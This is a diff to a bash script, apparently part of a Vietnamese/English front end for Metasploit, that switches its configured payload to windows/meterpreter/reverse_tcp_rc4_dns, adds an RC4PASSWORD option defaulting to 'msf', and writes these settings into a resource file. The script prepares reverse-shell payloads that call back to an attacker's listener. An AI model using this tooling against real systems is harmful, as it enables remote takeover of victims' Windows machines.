@@ -2,6 +2,7 @@ function defaul_payload_options {
 	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
 	lport="4444"
 	exitfunc="process"
+	rc4password="msf"
 }
 function payload_compare {
 lhost_lenght=`echo "$lhost" | awk '{print length}'`
@@ -19,6 +20,9 @@ function set_payload {
 		elif [[ "$new_processing_variables" = "lport" ]] || [[ "$new_processing_variables" = "LPORT" ]] || [[ "$new_processing_variables" = "Lport" ]]; then
 			unset lport
 			lport="$module_set"
+		elif [[ "$new_processing_variables" = "rc4password" ]] || [[ "$new_processing_variables" = "RC4PASSWORD" ]] || [[ "$new_processing_variables" = "Rc4password" ]]; then
+			unset rc4password
+			rc4password="$module_set"
 		elif [[ "$new_processing_variables" = "exitfunc" ]] || [[ "$new_processing_variables" = "EXITFUNC" ]] || [[ "$new_processing_variables" = "Exitfunc" ]]; then
 			if [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]]; then
 				unset exitfunc
@@ -50,6 +54,14 @@ myvar=""
 		none=" "
 		myvar=""
 	}
+rc4password=`echo $rc4password`
+rc4password_lenght=`echo $rc4password | awk '{print length}'`
+	integer=`expr 18 - $rc4password_lenght`			
+	for (( i = 0 ; i < $integer; i++ )) do
+		myvar=$myvar$none
+	done
+	rc4password=$rc4password$myvar
+unset_value
 lhost=`echo $lhost`
 lhost_lenght=`echo $lhost | awk '{print length}'`
 	integer=`expr 18 - $lhost_lenght`			
@@ -88,6 +100,14 @@ myvar=""
 		none=" "
 		myvar=""
 	}
+rc4password=`echo $rc4password`
+rc4password_lenght=`echo $rc4password | awk '{print length}'`
+	integer=`expr 27 - $rc4password_lenght`			
+	for (( i = 0 ; i < $integer; i++ )) do
+		myvar=$myvar$none
+	done
+	rc4password=$rc4password$myvar
+unset_value
 lhost=`echo $lhost`
 lhost_lenght=`echo $lhost | awk '{print length}'`
 	integer=`expr 27 - $lhost_lenght`			
@@ -121,26 +141,28 @@ if [ "$language" = "VN" ]; then
 yes="     Có   "
 no="     Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp_rc4_dns):
 
    Tên            Thiết lập hiện tại    Yêu cầu   Miêu tả
    ----           ----------------      --------  -----------
    EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
    LHOST          $lhost$yes    Địa chỉ lắng nghe.
    LPORT          $lport$yes    Cổng lắng nghe.
+   RC4PASSWORD    $rc4password$no   Mật khẩu để lấy khóa RC4
 
 !
 elif [ "$language" = "EN" ]; then
 yes="     yes"
 no="     no "
 cat << !
-Payload options (windows/meterpreter/reverse_tcp):
+Payload options (windows/meterpreter/reverse_tcp_rc4_dns):
 
    Name           Current Setting       Required  Description
    ----           ---------------       --------  -----------
    EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
    LHOST          $lhost$yes      The listen address.
    LPORT          $lport$yes      The listen port.
+   RC4PASSWORD    $rc4password$no      Password to derive RC4 key from
 
 !
 fi
@@ -150,26 +172,28 @@ if [ "$language" = "VN" ]; then
 yes="   Có  "
 no="   Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp_rc4_dns):
 
    Tên            Thiết lập hiện tại	       Yêu cầu    Miêu tả
    ----      	  ---------------  	       --------  -----------
    EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
    LHOST          $lhost$yes     Địa chỉ lắng nghe.
    LPORT          $lport$yes     Cổng lắng nghe.
+   RC4PASSWORD    $rc4password$no   Mật khẩu để lấy khóa RC4
 
 !
 elif [ "$language" = "EN" ]; then
 yes="   yes"
 no="   no "
 cat << !
-Payload options (windows/meterpreter/reverse_tcp):
+Payload options (windows/meterpreter/reverse_tcp_rc4_dns):
 
    Name           Current Setting  	       Required  Description
    ----           ---------------  	       --------  -----------
    EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
    LHOST          $lhost$yes      The listen address.
    LPORT          $lport$yes      The listen port.
+   RC4PASSWORD    $rc4password$no      Password to derive RC4 key from
 
 !
 fi
@@ -179,9 +203,10 @@ payload_path_present=`pwd`
 payload_path_rc_file="$payload_path_present/Config"
 rc_file="$payload_path_rc_file/file.rc"
 config_file="$payload_path_present/Config/config"
-	echo "set payload windows/meterpreter/reverse_tcp" >> $rc_file
+	echo "set payload windows/meterpreter/reverse_tcp_rc4_dns" >> $rc_file
 	echo "set EXITFUNC $exitfunc" >> $rc_file
-	paylo="windows/meterpreter/reverse_tcp"
+	echo "set RC4PASSWORD $rc4password" >> $rc_file
+	paylo="windows/meterpreter/reverse_tcp_rc4_dns"
 	lhost=$lhost
 	lport=$lport
 }
